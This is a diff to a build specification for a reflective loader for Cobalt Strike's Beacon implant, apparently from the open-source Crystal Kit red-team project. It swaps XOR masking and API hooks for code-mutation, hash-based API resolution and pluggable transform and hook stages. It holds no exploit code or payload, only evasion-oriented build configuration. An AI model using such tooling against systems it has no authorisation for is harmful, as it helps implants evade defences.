@@ -1,46 +1,44 @@
-x64:
-    load "bin/loader.x64.o"
-        make pic +gofirst +optimize +disco
+name       "Crystal Kit Loader"
+describe   "A UDRL for Cobalt Strike's Beacon."
+author     "@_RastaMouse"
+license    "MIT"
+reference  "https://rastamouse.me/crystal-kit/"
+defraw     "$DLL" "Beacon DLL"
+
+initpic.x64:
+    make pic +gofirst +disco +mutate +blockparty +shatter +optimize
     
-    # merge services
     load "bin/services.x64.o"
         merge
-
-    dfr "resolve" "ror13"
+    
+    dfr "resolve" "ror13" "KERNEL32, NTDLL"
+    dfr "resolve_ext" "strings"
+    
     mergelib "../libtcg.x64.zip"
 
-    # merge hooks into the loader
-    load "bin/hooks.x64.o"
-        merge
+x64:
+    load "bin/loader.x64.o"
+        .initpic
 
-    # merge call stack spoofing into the loader
-    load "bin/spoof.x64.o"
-        merge
+        foreach %transforms : call %_ "init"
 
-    # load the stack spoofing assembly
-    load "bin/draugr.x64.bin"
-        linkfunc "draugr_stub"
+        push $DLL
+            foreach %transforms : call %_ "apply"
+            prepend "length"
+            link "dll"
 
-    # hook functions that the loader uses
-    attach "KERNEL32$LoadLibraryA"    "_LoadLibraryA"
-    attach "KERNEL32$VirtualAlloc"    "_VirtualAlloc"
-    attach "KERNEL32$VirtualProtect"  "_VirtualProtect"
-    attach "KERNEL32$VirtualFree"     "_VirtualFree"
+        foreach %hooks: call %_ "setup"
 
-    # mask & link the dll
-    generate $MASK 128
-    
-    push $DLL
-        xor $MASK
-        preplen
-        link "dll"
+        load "bin/pico.x64.o"
+            make object +disco +mutate +blockparty +shatter
+            mergelib "../libtcg.x64.zip"
 
-    push $MASK
-        preplen
-        link "mask"
+            foreach %hooks: call %_ "hooks"
 
-    # now get the tradecraft as a PICO
-    run "pico.spec"
+            export
+
+        foreach %transforms : call %_ "apply"
+        prepend "length"
         link "pico"
 
-    export
+        export
